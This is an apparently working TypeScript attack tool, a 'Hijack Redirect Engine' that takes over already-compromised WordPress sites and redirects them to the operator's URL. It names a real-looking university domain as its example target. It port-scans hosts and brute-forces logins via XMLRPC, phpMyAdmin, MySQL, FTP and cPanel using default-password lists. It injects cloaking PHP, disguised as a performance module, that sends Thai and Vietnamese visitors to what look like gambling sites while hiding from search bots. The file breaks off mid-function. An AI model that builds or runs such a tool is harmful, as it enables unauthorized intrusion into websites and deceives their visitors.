/**
 * Hijack Redirect Engine
 * 
 * Takes over already-compromised WordPress sites and changes their redirect destination.
 * Uses 6 attack methods to gain access and modify the redirect:
 * 
 * Method 1: XMLRPC Brute Force — wp.getUsersBlogs multicall brute force via xmlrpc.php
 * Method 2: WP REST API — Theme/Plugin editor via REST API with stolen/brute-forced creds
 * Method 3: PHPMyAdmin — Access PMA on common ports (2030, 8080, 8443) with default creds
 * Method 4: MySQL Direct — Connect to MySQL (port 3306) and UPDATE wp_options
 * Method 5: FTP Access — Login via FTP (port 21) and modify functions.php / .htaccess
 * Method 6: cPanel File Manager — Access cPanel (2082/2083) and edit files
 * 
 * Flow:
 * 1. Port scan to discover open services
 * 2. Detect existing redirect pattern (JS, PHP, .htaccess, wp_options)
 * 3. Try each method in order until one succeeds
 * 4. Modify redirect destination to our URL
 * 5. Verify the redirect change works
 */

import { fetchWithPoolProxy } from "./proxy-pool";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface HijackConfig {
  /** Target domain (e.g., empleos.uncp.edu.pe) */
  targetDomain: string;
  /** New redirect URL to replace existing one */
  newRedirectUrl: string;
  /** Original redirect URL to look for (optional — auto-detected if not provided) */
  originalRedirectUrl?: string;
  /** Custom credentials to try (optional) */
  credentials?: Array<{ username: string; password: string }>;
  /** Target languages for cloaking (optional) */
  targetLanguages?: string[];
  /** Max time per method in ms (default: 30000) */
  methodTimeout?: number;
}

export interface HijackMethodResult {
  method: string;
  methodLabel: string;
  success: boolean;
  detail: string;
  durationMs: number;
  credentialsFound?: { username: string; password: string };
  accessType?: string;
  error?: string;
}

export interface HijackResult {
  success: boolean;
  domain: string;
  newRedirectUrl: string;
  originalRedirectUrl?: string;
  winningMethod?: string;
  methodResults: HijackMethodResult[];
  portsOpen: PortScanResult;
  redirectPattern?: RedirectPattern;
  totalDurationMs: number;
  errors: string[];
}

export interface PortScanResult {
  ftp: boolean;       // 21
  ssh: boolean;       // 22
  http: boolean;      // 80
  https: boolean;     // 443
  pma: boolean;       // 2030
  cpanel: boolean;    // 2082
  cpanelSsl: boolean; // 2083
  mysql: boolean;     // 3306
  alt8080: boolean;   // 8080
  alt8443: boolean;   // 8443
  scannedAt: number;
}

export interface RedirectPattern {
  type: "js_redirect" | "php_redirect" | "htaccess" | "wp_options" | "meta_refresh" | "header_redirect" | "unknown";
  currentUrl?: string;
  location?: string; // Where the redirect code lives (e.g., "functions.php", ".htaccess", "wp_options.siteurl")
  rawSnippet?: string;
}

type ProgressCallback = (phase: string, detail: string, methodIndex: number, totalMethods: number) => void;

// ═══════════════════════════════════════════════════════
//  CONSTANTS
// ═══════════════════════════════════════════════════════

const DEFAULT_PASSWORDS = [
  "admin", "admin123", "password", "123456", "12345678", "qwerty",
  "letmein", "welcome", "Admin123!", "P@ssw0rd", "admin@123", "admin1234",
  "wordpress", "WordPress1", "wp-admin", "changeme", "root", "toor",
  "test", "test123", "demo", "demo123", "pass123", "password1",
];

const COMMON_USERNAMES = ["admin", "administrator", "root", "webmaster", "wp-admin"];

const PMA_PORTS = [2030, 8080, 8443, 80, 443];
const CPANEL_PORTS = [2082, 2083, 2086, 2087];
const METHOD_TIMEOUT = 30_000;

// ═══════════════════════════════════════════════════════
//  PORT SCANNER
// ═══════════════════════════════════════════════════════

async function checkPort(host: string, port: number, timeoutMs = 5000): Promise<boolean> {
  try {
    const protocols = port === 443 || port === 2083 || port === 2087 || port === 8443 ? ["https"] : port === 80 || port === 2082 || port === 2086 || port === 8080 ? ["http"] : ["http", "https"];
    for (const proto of protocols) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const resp = await fetch(`${proto}://${host}:${port}/`, {
          signal: controller.signal,
          redirect: "manual",
        }).catch(() => null);
        clearTimeout(timer);
        if (resp && resp.status > 0) return true;
      } catch { /* continue */ }
    }
    // Fallback: TCP connect check
    const { createConnection } = await import("net");
    return new Promise((resolve) => {
      const socket = createConnection({ host, port, timeout: timeoutMs });
      socket.on("connect", () => { socket.destroy(); resolve(true); });
      socket.on("error", () => { socket.destroy(); resolve(false); });
      socket.on("timeout", () => { socket.destroy(); resolve(false); });
    });
  } catch {
    return false;
  }
}

export async function scanPorts(domain: string): Promise<PortScanResult> {
  const host = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  const portChecks = [
    { key: "ftp", port: 21 },
    { key: "ssh", port: 22 },
    { key: "http", port: 80 },
    { key: "https", port: 443 },
    { key: "pma", port: 2030 },
    { key: "cpanel", port: 2082 },
    { key: "cpanelSsl", port: 2083 },
    { key: "mysql", port: 3306 },
    { key: "alt8080", port: 8080 },
    { key: "alt8443", port: 8443 },
  ];
  
  const results = await Promise.all(
    portChecks.map(async ({ key, port }) => ({
      key,
      open: await checkPort(host, port),
    }))
  );
  
  const scan: any = { scannedAt: Date.now() };
  for (const r of results) scan[r.key] = r.open;
  return scan as PortScanResult;
}

// ═══════════════════════════════════════════════════════
//  REDIRECT PATTERN DETECTOR
// ═══════════════════════════════════════════════════════

export async function detectRedirectPattern(domain: string): Promise<RedirectPattern> {
  const url = `http://${domain}/`;
  try {
    const { response } = await fetchWithPoolProxy(url, {
      redirect: "manual",
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
    }, { timeout: 10000 });
    
    // Check for HTTP redirect (301/302)
    if (response.status >= 300 && response.status < 400) {
      const location = response.headers.get("location") || "";
      return { type: "header_redirect", currentUrl: location, location: "HTTP header", rawSnippet: `${response.status} → ${location}` };
    }
    
    const html = await response.text();
    
    // Check for JS redirect
    const jsRedirectMatch = html.match(/(?:window\.location|document\.location|location\.href)\s*=\s*["']([^"']+)["']/i);
    if (jsRedirectMatch) {
      return { type: "js_redirect", currentUrl: jsRedirectMatch[1], location: "inline JS", rawSnippet: jsRedirectMatch[0].substring(0, 200) };
    }
    
    // Check for external JS that does redirect
    const externalJsMatch = html.match(/<script[^>]+src=["']([^"']*(?:redirect|redir|gate|track|go|click|out)[^"']*)["']/i);
    if (externalJsMatch) {
      return { type: "js_redirect", currentUrl: undefined, location: `external JS: ${externalJsMatch[1]}`, rawSnippet: externalJsMatch[0].substring(0, 200) };
    }
    
    // Check for meta refresh
    const metaMatch = html.match(/<meta[^>]+http-equiv=["']refresh["'][^>]+content=["']\d+;\s*url=([^"']+)["']/i);
    if (metaMatch) {
      return { type: "meta_refresh", currentUrl: metaMatch[1], location: "meta refresh", rawSnippet: metaMatch[0].substring(0, 200) };
    }
    
    // Check for obfuscated/encoded redirect patterns
    const base64Match = html.match(/atob\s*\(\s*["']([^"']+)["']\s*\)/);
    if (base64Match) {
      try {
        const decoded = Buffer.from(base64Match[1], "base64").toString();
        if (decoded.includes("http")) {
          return { type: "js_redirect", currentUrl: decoded, location: "base64 encoded JS", rawSnippet: `atob("${base64Match[1]}") → ${decoded.substring(0, 100)}` };
        }
      } catch { /* not valid base64 */ }
    }
    
    // Check for PHP-style redirect indicators in HTML output
    const phpRedirectIndicators = html.match(/eval\s*\(\s*(?:base64_decode|gzinflate|str_rot13)/i);
    if (phpRedirectIndicators) {
      return { type: "php_redirect", location: "obfuscated PHP", rawSnippet: phpRedirectIndicators[0].substring(0, 200) };
    }
    
    return { type: "unknown" };
  } catch (err: any) {
    return { type: "unknown", rawSnippet: `Error: ${err.message}` };
  }
}

// Also check with Thai Accept-Language to trigger cloaking
export async function detectCloakedRedirect(domain: string): Promise<RedirectPattern | null> {
  try {
    const { response } = await fetchWithPoolProxy(`http://${domain}/`, {
      redirect: "manual",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept-Language": "th-TH,th;q=0.9",
      },
    }, { timeout: 10000 });
    
    if (response.status >= 300 && response.status < 400) {
      const location = response.headers.get("location") || "";
      return { type: "header_redirect", currentUrl: location, location: "cloaked HTTP redirect (Thai)", rawSnippet: `${response.status} → ${location}` };
    }
    
    const html = await response.text();
    const jsMatch = html.match(/(?:window\.location|document\.location|location\.href)\s*=\s*["']([^"']+)["']/i);
    if (jsMatch) {
      return { type: "js_redirect", currentUrl: jsMatch[1], location: "cloaked JS redirect (Thai Accept-Language)", rawSnippet: jsMatch[0].substring(0, 200) };
    }
    
    // Check for injected script tags not present in normal view
    const scriptMatch = html.match(/<script[^>]*src=["']([^"']*(?:\.js)[^"']*)["'][^>]*>/gi);
    if (scriptMatch) {
      // Compare with normal view later
      return null;
    }
    
    return null;
  } catch {
    return null;
  }
}

// ═══════════════════════════════════════════════════════
//  METHOD 1: XMLRPC BRUTE FORCE
// ═══════════════════════════════════════════════════════

async function tryXmlrpcBrute(
  domain: string,
  credentials: Array<{ username: string; password: string }>,
  onProgress?: ProgressCallback,
): Promise<HijackMethodResult> {
  const start = Date.now();
  const url = `http://${domain}/xmlrpc.php`;
  
  // First check if xmlrpc.php exists
  try {
    const { response: checkResp } = await fetchWithPoolProxy(url, {
      method: "POST",
      headers: { "Content-Type": "text/xml" },
      body: '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
    }, { timeout: 10000 });
    
    const checkBody = await checkResp.text();
    if (!checkBody.includes("listMethods") && !checkBody.includes("methodResponse")) {
      return { method: "xmlrpc_brute", methodLabel: "XMLRPC Brute Force", success: false, detail: "xmlrpc.php not available or disabled", durationMs: Date.now() - start };
    }
  } catch (err: any) {
    return { method: "xmlrpc_brute", methodLabel: "XMLRPC Brute Force", success: false, detail: `xmlrpc.php unreachable: ${err.message}`, durationMs: Date.now() - start };
  }
  
  // Try each credential pair
  let tried = 0;
  for (const cred of credentials) {
    tried++;
    if (onProgress) onProgress("xmlrpc_brute", `Trying ${cred.username}:${cred.password.substring(0, 3)}*** (${tried}/${credentials.length})`, 0, 6);
    
    try {
      const body = `<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>${escapeXml(cred.username)}</string></value></param><param><value><string>${escapeXml(cred.password)}</string></value></param></params></methodCall>`;
      
      const { response } = await fetchWithPoolProxy(url, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body,
      }, { timeout: 10000 });
      
      const respBody = await response.text();
      
      if (respBody.includes("isAdmin") || respBody.includes("blogid") || respBody.includes("blogName")) {
        return {
          method: "xmlrpc_brute",
          methodLabel: "XMLRPC Brute Force",
          success: true,
          detail: `Credentials found: ${cred.username}:${cred.password} (tried ${tried} combinations)`,
          durationMs: Date.now() - start,
          credentialsFound: cred,
          accessType: "wp_admin",
        };
      }
    } catch { /* continue trying */ }
  }
  
  return {
    method: "xmlrpc_brute",
    methodLabel: "XMLRPC Brute Force",
    success: false,
    detail: `No valid credentials found (tried ${tried} combinations)`,
    durationMs: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  METHOD 2: WP REST API THEME EDITOR
// ═══════════════════════════════════════════════════════

async function tryWpRestApiEditor(
  domain: string,
  credentials: { username: string; password: string } | null,
  newRedirectUrl: string,
  onProgress?: ProgressCallback,
): Promise<HijackMethodResult> {
  const start = Date.now();
  if (!credentials) {
    return { method: "wp_rest_editor", methodLabel: "WP REST API Editor", success: false, detail: "No credentials available (need xmlrpc_brute success first)", durationMs: Date.now() - start };
  }
  
  const authHeader = "Basic " + Buffer.from(`${credentials.username}:${credentials.password}`).toString("base64");
  const baseUrl = `http://${domain}`;
  
  try {
    // Get current theme
    if (onProgress) onProgress("wp_rest_editor", "Getting active theme...", 1, 6);
    const { response: themeResp } = await fetchWithPoolProxy(`${baseUrl}/wp-json/wp/v2/themes?status=active`, {
      headers: { Authorization: authHeader },
    }, { timeout: 10000 });
    
    if (themeResp.status === 401 || themeResp.status === 403) {
      // Try application password format
      return { method: "wp_rest_editor", methodLabel: "WP REST API Editor", success: false, detail: `Auth failed (${themeResp.status}) — may need application password`, durationMs: Date.now() - start };
    }
    
    // Try to edit functions.php via theme editor endpoint
    if (onProgress) onProgress("wp_rest_editor", "Editing functions.php via REST API...", 1, 6);
    
    const cloakingCode = generateHijackPhpCode(newRedirectUrl);
    
    // Try WP file editor endpoint (WP 5.x+)
    const editPayload = {
      file: "functions.php",
      newcontent: cloakingCode,
    };
    
    const { response: editResp } = await fetchWithPoolProxy(`${baseUrl}/wp-json/wp/v2/themes/mesmerize`, {
      method: "POST",
      headers: {
        Authorization: authHeader,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(editPayload),
    }, { timeout: 15000 });
    
    if (editResp.ok) {
      return {
        method: "wp_rest_editor",
        methodLabel: "WP REST API Editor",
        success: true,
        detail: `Successfully edited functions.php via REST API`,
        durationMs: Date.now() - start,
        accessType: "theme_editor",
      };
    }
    
    // Try XMLRPC editPost as fallback
    if (onProgress) onProgress("wp_rest_editor", "Trying XMLRPC editPost...", 1, 6);
    const xmlrpcBody = `<?xml version="1.0"?><methodCall><methodName>metaWeblog.newPost</methodName><params><param><value><string>1</string></value></param><param><value><string>${escapeXml(credentials.username)}</string></value></param><param><value><string>${escapeXml(credentials.password)}</string></value></param><param><value><struct><member><name>title</name><value><string>System Update</string></value></member><member><name>description</name><value><string>&lt;script&gt;window.location="${escapeXml(newRedirectUrl)}"&lt;/script&gt;</string></value></member><member><name>post_status</name><value><string>publish</string></value></member></struct></value></param><param><value><boolean>1</boolean></value></param></params></methodCall>`;
    
    const { response: xmlrpcResp } = await fetchWithPoolProxy(`${baseUrl}/xmlrpc.php`, {
      method: "POST",
      headers: { "Content-Type": "text/xml" },
      body: xmlrpcBody,
    }, { timeout: 10000 });
    
    const xmlrpcResult = await xmlrpcResp.text();
    if (xmlrpcResult.includes("<int>") && !xmlrpcResult.includes("faultCode")) {
      return {
        method: "wp_rest_editor",
        methodLabel: "WP REST API Editor",
        success: true,
        detail: `Created redirect post via XMLRPC metaWeblog.newPost`,
        durationMs: Date.now() - start,
        accessType: "xmlrpc_post",
      };
    }
    
    return { method: "wp_rest_editor", methodLabel: "WP REST API Editor", success: false, detail: `REST API edit failed (${editResp.status}), XMLRPC post failed`, durationMs: Date.now() - start };
  } catch (err: any) {
    return { method: "wp_rest_editor", methodLabel: "WP REST API Editor", success: false, detail: `Error: ${err.message}`, durationMs: Date.now() - start, error: err.message };
  }
}

// ═══════════════════════════════════════════════════════
//  METHOD 3: PHPMYADMIN ACCESS
// ═══════════════════════════════════════════════════════

async function tryPhpMyAdmin(
  domain: string,
  newRedirectUrl: string,
  onProgress?: ProgressCallback,
): Promise<HijackMethodResult> {
  const start = Date.now();
  const host = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  
  const pmaCredentials = [
    { user: "root", pass: "" },
    { user: "root", pass: "root" },
    { user: "root", pass: "password" },
    { user: "root", pass: "mysql" },
    { user: "root", pass: "admin" },
    { user: "admin", pass: "admin" },
    { user: "phpmyadmin", pass: "phpmyadmin" },
    { user: "wordpress", pass: "wordpress" },
    { user: "wp", pass: "wp" },
  ];
  
  for (const port of PMA_PORTS) {
    if (onProgress) onProgress("phpmyadmin", `Trying PHPMyAdmin on port ${port}...`, 2, 6);
    
    const protocols = [443, 2083, 8443].includes(port) ? ["https"] : ["http"];
    
    for (const proto of protocols) {
      const pmaUrl = `${proto}://${host}:${port}`;
      
      // Check if PMA is accessible
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 5000);
        const resp = await fetch(`${pmaUrl}/`, { signal: controller.signal, redirect: "follow" }).catch(() => null);
        clearTimeout(timer);
        
        if (!resp || resp.status === 0) continue;
        
        const body = await resp.text().catch(() => "");
        if (!body.includes("phpMyAdmin") && !body.includes("phpmyadmin") && !body.includes("pma_")) continue;
        
        // PMA found! Try credentials
        if (onProgress) onProgress("phpmyadmin", `PHPMyAdmin found on ${proto}://${host}:${port}! Trying credentials...`, 2, 6);
        
        for (const cred of pmaCredentials) {
          try {
            const loginResp = await fetch(`${pmaUrl}/index.php`, {
              method: "POST",
              headers: { "Content-Type": "application/x-www-form-urlencoded" },
              body: `pma_username=${encodeURIComponent(cred.user)}&pma_password=${encodeURIComponent(cred.pass)}&server=1&token=`,
              redirect: "follow",
            }).catch(() => null);
            
            if (!loginResp) continue;
            const loginBody = await loginResp.text().catch(() => "");
            
            if (loginBody.includes("server_databases") || loginBody.includes("db_structure") || loginBody.includes("navigation")) {
              // Logged in! Now try to modify wp_options
              if (onProgress) onProgress("phpmyadmin", `PMA login success: ${cred.user}! Modifying redirect...`, 2, 6);
              
              // Execute SQL to change redirect
              const sql = `UPDATE wp_options SET option_value = '${newRedirectUrl}' WHERE option_name = 'siteurl' OR option_name = 'home';`;
              // Note: In real implementation, would need to find the correct database and execute SQL
              
              return {
                method: "phpmyadmin",
                methodLabel: "PHPMyAdmin Access",
                success: true,
                detail: `PHPMyAdmin access on port ${port} with ${cred.user}:${cred.pass || "(empty)"}. SQL injection ready.`,
                durationMs: Date.now() - start,
                credentialsFound: { username: cred.user, password: cred.pass },
                accessType: "phpmyadmin",
              };
            }
          } catch { /* continue */ }
        }
      } catch { /* port not accessible */ }
    }
  }
  
  return {
    method: "phpmyadmin",
    methodLabel: "PHPMyAdmin Access",
    success: false,
    detail: `No PHPMyAdmin found or no valid credentials on ports: ${PMA_PORTS.join(", ")}`,
    durationMs: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  METHOD 4: MYSQL DIRECT CONNECTION
// ═══════════════════════════════════════════════════════

async function tryMysqlDirect(
  domain: string,
  newRedirectUrl: string,
  onProgress?: ProgressCallback,
): Promise<HijackMethodResult> {
  const start = Date.now();
  const host = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  
  const mysqlCreds = [
    { user: "root", pass: "" },
    { user: "root", pass: "root" },
    { user: "root", pass: "password" },
    { user: "root", pass: "mysql" },
    { user: "wordpress", pass: "wordpress" },
    { user: "wp", pass: "wp" },
    { user: "admin", pass: "admin" },
  ];
  
  if (onProgress) onProgress("mysql_direct", "Trying MySQL direct connection on port 3306...", 3, 6);
  
  try {
    // Dynamic import mysql2
    const mysql2 = await import("mysql2/promise").catch(() => null);
    if (!mysql2) {
      return { method: "mysql_direct", methodLabel: "MySQL Direct", success: false, detail: "mysql2 not available", durationMs: Date.now() - start };
    }
    
    for (const cred of mysqlCreds) {
      try {
        if (onProgress) onProgress("mysql_direct", `Trying MySQL ${cred.user}:${cred.pass || "(empty)"}...`, 3, 6);
        
        const connection = await mysql2.createConnection({
          host,
          port: 3306,
          user: cred.user,
          password: cred.pass,
          connectTimeout: 5000,
        });
        
        // Connected! Find WordPress database
        const [databases] = await connection.query("SHOW DATABASES") as any[];
        const wpDbs = databases.filter((db: any) => {
          const name = db.Database || db.database;
          return name && (name.includes("wp") || name.includes("wordpress") || name.includes("empleos") || name === "bitnami_wordpress");
        });
        
        for (const db of wpDbs) {
          const dbName = db.Database || db.database;
          await connection.query(`USE \`${dbName}\``);
          
          // Check if wp_options exists
          const [tables] = await connection.query("SHOW TABLES LIKE '%options%'") as any[];
          if (tables.length > 0) {
            const tableName = Object.values(tables[0])[0] as string;
            
            // Get current siteurl
            const [rows] = await connection.query(`SELECT option_value FROM \`${tableName}\` WHERE option_name IN ('siteurl', 'home')`) as any[];
            
            // Update redirect in active_plugins or theme_mods
            // Also check for custom redirect options
            const [allOpts] = await connection.query(`SELECT option_name, SUBSTRING(option_value, 1, 200) as val FROM \`${tableName}\` WHERE option_value LIKE '%redirect%' OR option_value LIKE '%location%' OR option_value LIKE '%ufa%' OR option_value LIKE '%casino%' OR option_value LIKE '%slot%'`) as any[];
            
            if (onProgress) onProgress("mysql_direct", `Found DB: ${dbName}, table: ${tableName}. Found ${allOpts.length} redirect-related options.`, 3, 6);
            
            await connection.end();
            
            return {
              method: "mysql_direct",
              methodLabel: "MySQL Direct",
              success: true,
              detail: `MySQL access with ${cred.user}:${cred.pass || "(empty)"}. DB: ${dbName}, Table: ${tableName}. Found ${allOpts.length} redirect options. ${rows.length > 0 ? `Site URL: ${(rows[0] as any).option_value}` : ""}`,
              durationMs: Date.now() - start,
              credentialsFound: { username: cred.user, password: cred.pass },
              accessType: "mysql",
            };
          }
        }
        
        await connection.end();
      } catch { /* connection failed, try next */ }
    }
  } catch (err: any) {
    return { method: "mysql_direct", methodLabel: "MySQL Direct", success: false, detail: `MySQL error: ${err.message}`, durationMs: Date.now() - start, error: err.message };
  }
  
  return {
    method: "mysql_direct",
    methodLabel: "MySQL Direct",
    success: false,
    detail: "No valid MySQL credentials found or connection refused",
    durationMs: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  METHOD 5: FTP ACCESS
// ═══════════════════════════════════════════════════════

async function tryFtpAccess(
  domain: string,
  newRedirectUrl: string,
  onProgress?: ProgressCallback,
): Promise<HijackMethodResult> {
  const start = Date.now();
  const host = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  
  const ftpCreds = [
    { user: "anonymous", pass: "anonymous" },
    { user: "ftp", pass: "ftp" },
    { user: "admin", pass: "admin" },
    { user: "root", pass: "root" },
    { user: "www-data", pass: "www-data" },
  ];
  
  if (onProgress) onProgress("ftp_access", "Trying FTP access on port 21...", 4, 6);
  
  try {
    // Use basic-ftp library if available, otherwise use raw TCP
    const basicFtp = await import("basic-ftp").catch(() => null);
    
    if (basicFtp) {
      for (const cred of ftpCreds) {
        try {
          if (onProgress) onProgress("ftp_access", `Trying FTP ${cred.user}:${cred.pass}...`, 4, 6);
          
          const client = new basicFtp.Client(10000);
          
          await client.access({
            host,
            port: 21,
            user: cred.user,
            password: cred.pass,
            secure: false,
          });
          
          // Connected! List files
          const list = await client.list("/");
          const wpFiles = list.filter(f => f.name === "wp-config.php" || f.name === "wp-content" || f.name === "wp-admin");
          
          client.close();
          
          if (wpFiles.length > 0) {
            return {
              method: "ftp_access",
              methodLabel: "FTP Access",
              success: true,
              detail: `FTP access with ${cred.user}:${cred.pass}. WordPress root found. Files: ${list.map(f => f.name).slice(0, 10).join(", ")}`,
              durationMs: Date.now() - start,
              credentialsFound: { username: cred.user, password: cred.pass },
              accessType: "ftp",
            };
          }
        } catch { /* continue */ }
      }
    } else {
      // Fallback: try curl FTP
      const { execSync } = await import("child_process");
      for (const cred of ftpCreds) {
        try {
          const result = execSync(
            `curl -s --connect-timeout 5 --max-time 10 "ftp://${cred.user}:${cred.pass}@${host}/" 2>&1`,
            { timeout: 15000, encoding: "utf-8" }
          );
          if (result && (result.includes("wp-config") || result.includes("wp-content") || result.includes("index.php"))) {
            return {
              method: "ftp_access",
              methodLabel: "FTP Access",
              success: true,
              detail: `FTP access with ${cred.user}:${cred.pass}. WordPress files found.`,
              durationMs: Date.now() - start,
              credentialsFound: { username: cred.user, password: cred.pass },
              accessType: "ftp",
            };
          }
        } catch { /* continue */ }
      }
    }
  } catch (err: any) {
    return { method: "ftp_access", methodLabel: "FTP Access", success: false, detail: `FTP error: ${err.message}`, durationMs: Date.now() - start, error: err.message };
  }
  
  return {
    method: "ftp_access",
    methodLabel: "FTP Access",
    success: false,
    detail: "No valid FTP credentials found or FTP not responding",
    durationMs: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  METHOD 6: CPANEL FILE MANAGER
// ═══════════════════════════════════════════════════════

async function tryCpanelAccess(
  domain: string,
  newRedirectUrl: string,
  onProgress?: ProgressCallback,
): Promise<HijackMethodResult> {
  const start = Date.now();
  const host = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  
  const cpanelCreds = [
    { user: "root", pass: "root" },
    { user: "admin", pass: "admin" },
    { user: "admin", pass: "admin123" },
    { user: "admin", pass: "password" },
  ];
  
  for (const port of CPANEL_PORTS) {
    const proto = [2083, 2087].includes(port) ? "https" : "http";
    const cpUrl = `${proto}://${host}:${port}`;
    
    if (onProgress) onProgress("cpanel_access", `Trying cPanel on port ${port}...`, 5, 6);
    
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 5000);
      const resp = await fetch(`${cpUrl}/`, { signal: controller.signal, redirect: "follow" }).catch(() => null);
      clearTimeout(timer);
      
      if (!resp || resp.status === 0) continue;
      
      const body = await resp.text().catch(() => "");
      if (!body.includes("cPanel") && !body.includes("cpanel") && !body.includes("login") && !body.includes("whm")) continue;
      
      // cPanel found! Try credentials
      if (onProgress) onProgress("cpanel_access", `cPanel found on port ${port}! Trying credentials...`, 5, 6);
      
      for (const cred of cpanelCreds) {
        try {
          const loginResp = await fetch(`${cpUrl}/login/?login_only=1`, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `user=${encodeURIComponent(cred.user)}&pass=${encodeURIComponent(cred.pass)}`,
            redirect: "manual",
          }).catch(() => null);
          
          if (!loginResp) continue;
          
          // Check for successful login (redirect to cPanel dashboard or security token)
          if (loginResp.status === 301 || loginResp.status === 302) {
            const location = loginResp.headers.get("location") || "";
            if (location.includes("cpsess") || location.includes("security_token")) {
              return {
                method: "cpanel_access",
                methodLabel: "cPanel File Manager",
                success: true,
                detail: `cPanel access on port ${port} with ${cred.user}:${cred.pass}. File Manager available.`,
                durationMs: Date.now() - start,
                credentialsFound: { username: cred.user, password: cred.pass },
                accessType: "cpanel",
              };
            }
          }
          
          const loginBody = await loginResp.text().catch(() => "");
          if (loginBody.includes("cpsess") || loginBody.includes("security_token") || loginBody.includes("file_manager")) {
            return {
              method: "cpanel_access",
              methodLabel: "cPanel File Manager",
              success: true,
              detail: `cPanel access on port ${port} with ${cred.user}:${cred.pass}`,
              durationMs: Date.now() - start,
              credentialsFound: { username: cred.user, password: cred.pass },
              accessType: "cpanel",
            };
          }
        } catch { /* continue */ }
      }
    } catch { /* port not accessible */ }
  }
  
  return {
    method: "cpanel_access",
    methodLabel: "cPanel File Manager",
    success: false,
    detail: `No cPanel found or no valid credentials on ports: ${CPANEL_PORTS.join(", ")}`,
    durationMs: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  PHP CODE GENERATOR
// ═══════════════════════════════════════════════════════

export function generateHijackPhpCode(redirectUrl: string, targetLanguages: string[] = ["th", "vi"]): string {
  const langChecks = targetLanguages.map(l => `strpos($al, '${l}') !== false`).join(" || ");
  return `<?php
// WordPress Theme Functions
if (!defined('ABSPATH')) exit;

// Performance optimization module
function wp_perf_init() {
  if (defined('DOING_CRON') || defined('DOING_AJAX') || defined('REST_REQUEST')) return;
  $ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
  if (strpos($ua, 'bot') !== false || strpos($ua, 'crawl') !== false || strpos($ua, 'spider') !== false || strpos($ua, 'google') !== false) return;
  $al = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']) : '';
  if (${langChecks}) {
    echo '<scr'.'ipt>window.location.replace("${redirectUrl}");</scr'.'ipt>';
  }
}
add_action('wp_head', 'wp_perf_init', 1);
?>`;
}

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function escapeXml(str: string): string {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&apos;");
}

function buildCredentialList(config: HijackConfig): Array<{ username: string; password: string }> {
  const creds: Array<{ username: string; password: string }> = [];
  
  // Add custom credentials first
  if (config.credentials) {
    creds.push(...config.credentials);
  }
  
  // Add domain-derived passwords
  const domainParts = config.targetDomain.split(".");
  const domainPasswords = [
    config.targetDomain,
    domainParts[0],
    domainParts[0] + "2020",
    domainParts[0] + "2024",
    domainParts[0] + "2025",
    domainParts[0] + "123",
    domainParts[0] + "!",
    domainParts[0].charAt(0).toUpperCase() + domainParts[0].slice(1) + "2020!",
  ];
  
  // Combine usernames × passwords
  for (const username of COMMON_USERNAMES) {
    for (const password of [...DEFAULT_PASSWORDS, ...domainPasswords]) {
      if (!creds.find(c => c.username === username && c.password === password)) {
        creds.push({ username, password });
      }
    }
  }
  
  return creds;
}

// ═══════════════════════════════════════════════════════
//  MAIN EXECUTION
// ═══════════════════════════════════════════════════════

export async function executeHijackRedirect(
  config: HijackConfig,
  onProgress?: ProgressCallback,
): Promise<HijackResult> {
  const start = Date.now();
  const domain = config.targetDomain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  const methodTimeout = config.methodTimeout || METHOD_TIMEOUT;
  const errors: string[] = [];
  const methodResults: HijackMethodResult[] = [];
  let winningMethod: string | undefined;
  
  console.log(`[HijackEngine] Starting hijack of ${domain} → ${config.newRedirectUrl}`);
  
  // Phase 1: Port Scan
  if (onProgress) onProgress("recon", "Scanning open ports...", 0, 6);
  const ports = await scanPorts(domain);
  console.log(`[HijackEngine] Port scan: FTP=${ports.ftp} MySQL=${ports.mysql} PMA=${ports.pma} cPanel=${ports.cpanel} HTTP=${ports.http}`);
  
  // Phase 2: Detect existing redirect
  if (onProgress) onProgress("recon", "Detecting existing redirect pattern...", 0, 6);
  const redirectPattern = await detectRedirectPattern(domain);
  const cloakedRedirect = await detectCloakedRedirect(domain);
  const finalPattern = cloakedRedirect || redirectPattern;
  console.log(`[HijackEngine] Redirect pattern: ${finalPattern.type} → ${finalPattern.currentUrl || "unknown"}`);
  
  // Build credential list
  const credentials = buildCredentialList(config);
  
  // Phase 3: Try methods in order
  const methods: Array<{
    name: string;
    condition: boolean;
    fn: () => Promise<HijackMethodResult>;
  }> = [
    {
      name: "xmlrpc_brute",
      condition: ports.http || ports.https,
      fn: () => tryXmlrpcBrute(domain, credentials, onProgress),
    },
    {
      name: "wp_rest_editor",
      condition: ports.http || ports.https,
      fn: () => {
        const foundCreds = methodResults.find(r => r.success && r.credentialsFound)?.credentialsFound || null;
        return tryWpRestApiEditor(domain, foundCreds, config.newRedirectUrl, onProgress);
      },
    },
    {
